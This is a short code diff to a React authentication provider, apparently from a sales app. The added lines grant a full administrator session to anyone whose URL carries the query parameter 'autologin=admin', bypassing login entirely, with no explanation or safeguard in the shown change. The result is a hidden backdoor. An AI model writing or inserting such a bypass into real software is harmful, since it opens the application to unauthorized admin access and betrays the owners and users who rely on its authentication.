@@ -5,6 +5,10 @@ const AuthContext = createContext(null)
 
 export function AuthProvider({ children }) {
   const [user, setUser] = useState(() => {
+    const params = new URLSearchParams(window.location.search)
+    if (params.get('autologin') === 'admin') {
+      return { username: 'admin', rol: 'administrador', vendedor_id: null }
+    }
     try {
       const saved = localStorage.getItem('pv_user')
       return saved ? JSON.parse(saved) : null
